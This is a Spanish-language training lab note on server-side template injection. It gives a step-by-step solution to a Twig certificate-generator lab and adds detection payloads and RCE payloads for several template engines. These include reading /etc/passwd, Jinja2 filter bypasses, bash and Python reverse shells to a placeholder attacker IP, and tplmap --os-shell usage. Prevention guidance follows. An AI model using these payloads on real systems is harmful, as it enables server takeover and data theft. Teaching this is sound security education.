---
title: "Lab - Server-Side Template Injection (SSTI)"
date: "2026-10-08"
author: "Manuel FR"
tags:
  - ifct0109
  - poc
  - vulnerabilidades-web
  - web
  - vulnweb
  - ssti
---

> [[02 - MODULOS/05 - Prácticas (PoCs)|← Volver a Prácticas (PoCs)]] | [[02 - MODULOS/Prácticas (PoCs)/Vulnerabilidades Web/00 - Índice del Módulo Vulnerabilidades Web|Índice del Módulo]]

---
# Lab - Server-Side Template Injection (SSTI)

# 🎨 Server-Side Template Injection (SSTI)

 

## Inyección en Motores de Plantillas del Servidor

 
 
 

## 📚 ¿Qué es Server-Side Template Injection (SSTI)?

 

**Server-Side Template Injection (SSTI)** es una vulnerabilidad que ocurre cuando una aplicación web utiliza un motor de plantillas para renderizar páginas y permite que entrada del usuario se inyecte directamente en las plantillas sin sanitización adecuada. Esto permite a un atacante ejecutar código arbitrario en el servidor.
 
 

Esta vulnerabilidad surge cuando:
 

 
* La entrada del usuario se concatena directamente en plantillas del lado del servidor
 
* Los datos no confiables se procesan como parte de la sintaxis de la plantilla
 
* No se valida o escapa correctamente la entrada antes de renderizar la plantilla
 

 

> [!note]
> 
 **⚠️ Impacto:** SSTI puede llevar a Remote Code Execution (RCE), permitiendo al atacante ejecutar comandos arbitrarios del sistema, leer archivos sensibles, acceder a bases de datos y comprometer completamente el servidor. Es una vulnerabilidad crítica con impacto similar a Command Injection.
> 

 

 
 
 

## 🧪 Laboratorios Prácticos

 

Completa estos laboratorios progresivos para dominar la explotación de SSTI:

 
 
 

### Lab 1: SSTI en Generador de Certificados (Twig)

 FÁCIL
 
 
 

 Este laboratorio contiene un sistema de generación de certificados académicos que utiliza el motor de plantillas Twig (PHP) para personalizar los certificados. La aplicación concatena directamente el nombre del usuario en la plantilla sin sanitización, creando una vulnerabilidad SSTI crítica.
 
 
 
 **🎯 Objetivo:** Detecta y explota la vulnerabilidad SSTI para ejecutar código en el servidor y leer el contenido del archivo `/secret.txt`.
 
 
 
 🚀 Acceder al Laboratorio
 
 
 
 
 💡 Ver Solución
 ▼
 
 
 

#### Solución Paso a Paso:

 

 
1. Accede al laboratorio y encuentra el formulario del generador de certificados
 
2. Introduce tu nombre normal (ej: "Juan Pérez") y genera el certificado para ver el comportamiento
 
3. Observa que tu nombre se refleja directamente en el certificado generado
 
4. Detecta SSTI probando payloads en el campo "Nombre Completo"
 

 
 

#### Fase 1: Detección de SSTI

 
# Probar expresiones matemáticas

${7*7}

{{7*7}}

{{7*'7'}}
 
 

**Resultado esperado:**
 

 
* Si ves `49` en el certificado → Vulnerable a SSTI
 
* Si ves `{{7*7}}` sin evaluar → No vulnerable o sintaxis incorrecta
 

 
 

#### Fase 2: Identificar Motor (Twig)

 

Sabemos que es **Twig** porque:
 

 
* `{{7*7}}` → Muestra `49` ✅
 
* `{{7*'7'}}` → Muestra `49` (no `7777777` como Jinja2)
 
* Motor de plantillas PHP (no Python)
 

 
 

#### Fase 3: Explotación - Leer /secret.txt

 
# Payload principal: Usar filter() de Twig

{{ ['cat /secret.txt']|filter('system') }}

# Payload alternativo: map()

{{ ['cat /secret.txt']|map('system')|join }}

# Payload con array y reduce

{{ {'a':'cat /secret.txt'}|map('system')|join }}
 
 
 

#### Comandos adicionales para exploración:

 
{{ ['whoami']|filter('system') }} # Ver usuario actual

{{ ['pwd']|filter('system') }} # Directorio actual

{{ ['ls -la']|filter('system') }} # Listar archivos

{{ ['cat /etc/passwd']|filter('system') }} # Leer passwd

{{ ['id']|filter('system') }} # Ver UID/GID

{{ ['ping -c 4 172.17.0.3']|filter('system') }} # Realizar ping sobre nuestra Kali ($ sudo tcpdump icmp) 
 
 
 

#### Explicación del Payload:

 
{{ ['cat /secret.txt']|filter('system') }}

 ^^^^^^^^^^^^^^^^ ^^^^^^ ^^^^^^^^

 │ │ │

 Array con Filtro de Función PHP

 el comando Twig a ejecutar

# El filtro filter() de Twig aplica la función PHP

# 'system' a cada elemento del array
 
 
 

**Resultado esperado:** El certificado mostrará el contenido del archivo `/secret.txt` en el campo del nombre, revelando la FLAG.
 
 

> [!note]
> 
 **💡 Concepto clave:** Twig es un motor de plantillas PHP usado en Symfony. El filtro `filter()` permite aplicar funciones PHP a arrays. Al pasar `'system'` como argumento, ejecutamos comandos del sistema operativo. Esta vulnerabilidad surge porque el nombre del usuario se concatena directamente en la plantilla string antes de renderizarla.
> 

 
 

#### Diferencias Twig vs Jinja2:

 
 
 
 
 
 
 
 `{{7*7}}`
 
 
 
 
 `{{7*'7'}}`
 
 
 
 

| Payload | Twig (PHP) | Jinja2 (Python) |
| --- | --- | --- |
| | 49 | 49 |
| | 49 | 7777777 |

 
 
 

 
 

> [!note]
> 
 
> **🚧 Más laboratorios próximamente...**
> 

 

 
 
 

## 🔍 ¿Cómo Funciona SSTI?

 

Los motores de plantillas son utilizados para generar HTML dinámico mezclando datos con plantillas predefinidas.

 

### Ejemplo Seguro:

 
// PHP con Smarty - SEGURO

$smarty->assign('name', $user_input);

$smarty->display('template.tpl'); // ✅ Seguro

// Plantilla template.tpl:

Hello {$name}!
 

 

### Ejemplo Vulnerable:

 
// PHP con Smarty - VULNERABLE

$template = "Hello ". $user_input. "!"; // ❌ VULNERABLE

$smarty->display('string:'. $template);
 

 

En el ejemplo vulnerable, si el usuario introduce `{system('id')}`, el motor ejecutará el comando `id` en el servidor.
 

 
 

## 🎯 Motores de Plantillas Comunes

 

Diferentes lenguajes y frameworks utilizan diferentes motores de plantillas:

 
 
 
 
 
 
 
 
 
 
 
 **Jinja2**
 
 `{{... }}`
 
 
 
 **Twig**
 
 `{{... }}`
 
 
 
 **Smarty**
 
 `{$var}`
 
 
 
 **Freemarker**
 
 `${...}`
 
 
 
 **ERB**
 
 `<%=... %>`
 
 
 
 **Velocity**
 
 `$var`
 
 
 
 

| Motor | Lenguaje | Sintaxis | Frameworks |
| --- | --- | --- | --- |
| | Python | | Flask, Django |
| | PHP | | Symfony |
| | PHP | | - |
| | Java | | Spring |
| | Ruby | | Rails |
| | Java | | - |

 

 
 

## 🔬 Detección de SSTI

 

El primer paso es detectar si la aplicación es vulnerable a SSTI:

 

![SSTI Diagram](../../../archivos_descargados/imagenes/vulnerabilidades_web/vulnweb/files/ssti.png)

 

### Payloads de Detección Básicos:

 
# Operaciones matemáticas

{{7*7}}

${7*7}

<%=7*7%>

{7*7}

# Concatenación de strings

{{7*'7'}}

${'a'*7}
 

 

### Respuestas Esperadas:

 

 
* **49** → Vulnerable, el motor evaluó la expresión matemática
 
* **7777777** → Jinja2/Twig (repitiendo el string 7 veces)
		{{7*'7'}} En Jinja el resultado es 7777777 y en Twig es 49
 
* **{{7*7}}** → No vulnerable o sintaxis incorrecta
 

 

### Árbol de Decisión para Identificar el Motor:

 
Probar: {{7*'7'}}

│

├─ Respuesta: 49

│ └─ Motor no soporta repetición de strings

│ Probar: ${7*7}

│ ├─ Funciona → Freemarker, Velocity

│ └─ No funciona → Smarty

│

├─ Respuesta: 7777777

│ └─ Jinja2 o Twig

│ Probar: {{config}}

│ ├─ Muestra config → Jinja2 (Python/Flask)

│ └─ Error → Twig (PHP/Symfony)

│

└─ No respuesta / error

 └─ Probar otras sintaxis ({...}, <%...%>)
 
 

 
 

## 💣 Payloads de Explotación por Motor

 

### Smarty (PHP):

 
# Ejecutar comandos

{system('cat /etc/passwd')}

{system('id')}

{system('whoami')}

# Ejecutar PHP

{php}{/php}

{php}system('ls -la');{/php}

# Leer archivos

{php}readfile('/secret.txt');{/php}
 

 

### Jinja2 (Python/Flask):

 
# Acceso a configuración

{{ config }}

{{ config.items() }}

# Ejecución de comandos

{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}

# Leer archivos

{{ ''.__class__.__mro__[1].__subclasses__()[414]('/etc/passwd').read() }}
 

 

### Twig (PHP/Symfony):

 
# RCE usando filter

{{ ['id']|filter('system') }}

{{ ['cat /etc/passwd']|filter('system') }}

{{ ['whoami']|filter('system') }}

# RCE usando registerUndefinedFilterCallback

{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}

# PHP info

{{_self.env.registerUndefinedFilterCallback("phpinfo")}}{{_self.env.getFilter(0)}}
 

 

### Freemarker (Java):

 
# RCE

<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Leer archivos

<#assign file="freemarker.template.utility.ObjectConstructor"?new()>

${file("java.io.File","/etc/passwd").exists()}
 

 

### ERB (Ruby/Rails):

 
# RCE

<%= system('id') %>

<%= `whoami` %>

<%= IO.popen('ls').readlines() %>

# Leer archivos

<%= File.open('/etc/passwd').read %>
 
 

 
 

## 🎭 Técnicas Avanzadas

 

### 1. Bypass de Filtros (Jinja2)

 
# Si "config" está filtrado:

{{ self.__dict__._TemplateReference__context.config }}

# Si "__" está filtrado:

{{ ''['_'*2+'class'+'_'*2] }}

{{ request|attr('\x5f\x5fclass\x5f\x5f') }}

# Si "class" está filtrado:

{{ ''|attr('_'*2~'cla'~'ss'~'_'*2) }}
 

 

### 2. Navegación por Clases (Jinja2)

 
# Listar todas las subclases disponibles

{{ ''.__class__.__mro__[1].__subclasses__() }}

# Buscar índice útil (varía según versión de Python)

{% for i in range(500) %}

 {{ i }}: {{ ''.__class__.__mro__[1].__subclasses__()[i] }}

{% endfor %}

# Usar índice encontrado para RCE

{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen('COMMAND').read() }}
 

 

### 3. Reverse Shell

 
# Smarty (PHP)

{system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')}

# Jinja2 (Python)

{{ config.__class__.__init__.__globals__['os'].popen('python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]);"').read() }}
 
 

 
 

## 🛡️ Prevención de SSTI

 

### 1. Nunca Concatenar Entrada del Usuario en Plantillas

 
// ❌ VULNERABLE

$template = "Hello " + user_input + "!";

$smarty->display('string:'. $template);

// ✅ SEGURO

$smarty->assign('name', $user_input);

$smarty->display('template.tpl');
 

 

### 2. Usar Plantillas Predefinidas

 
# Python/Flask - SEGURO

render_template('welcome.html', name=user_input)

# NO USAR render_template_string con entrada del usuario

render_template_string(user_template) # ❌ PELIGROSO
 

 

### 3. Sandbox y Entornos Restringidos

 
# Jinja2 - Usar SandboxedEnvironment

from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()

template = env.from_string(user_template)

# Smarty - Habilitar security policy

$smarty->enableSecurity();

$smarty->security_policy->php_handling = Smarty::PHP_REMOVE;
 

 

### 4. Validación Estricta de Entrada

 

 
* Usar listas blancas de caracteres permitidos
 
* Rechazar entrada que contenga sintaxis de plantillas: `{{ }}`, `${ }`, `{ }`
 
* Validar que no contenga `__`, `.`, `[]` si debe usarse en plantillas
 

 

### 5. Deshabilitar Funcionalidades Peligrosas

 
# Smarty - Deshabilitar PHP en plantillas

$smarty->security_policy->php_handling = Smarty::PHP_REMOVE;

$smarty->security_policy->php_modifiers = array();

# Twig - Modo sandbox

$policy = new \Twig\Sandbox\SecurityPolicy();

$sandbox = new \Twig\Extension\SandboxExtension($policy);

$twig->addExtension($sandbox);
 

 

### 6. Principio de Menor Privilegio

 

 
* Ejecutar la aplicación con permisos mínimos
 
* No ejecutar como root o Administrator
 
* Usar contenedores con permisos limitados
 

 

 
 

## 🔧 Herramientas para Testing

 

 
* **Tplmap** - Herramienta automatizada para detectar y explotar SSTI
 
* **SSTImap** - Scanner con soporte para múltiples motores
 
* **Burp Suite** - Con extensiones específicas para SSTI
 
* **Testing Manual** - Siempre el más efectivo
 

 

### Uso de Tplmap:

 
# Escaneo básico

python tplmap.py -u 'http://target.com/page?name=test'

# Método POST

python tplmap.py -u 'http://target.com/page' -d 'name=test'

# Shell interactivo

python tplmap.py -u 'http://target.com/page?name=test' --os-shell
 
 

 
 

**🛡️ VulnWeb Lab** - Laboratorio de Vulnerabilidades Web
 

© 2025 - Entorno Educativo IFCT0109

---

> [[02 - MODULOS/05 - Prácticas (PoCs)|← Volver a Prácticas (PoCs)]] | [[02 - MODULOS/Prácticas (PoCs)/Vulnerabilidades Web/00 - Índice del Módulo Vulnerabilidades Web|Índice del Módulo]]
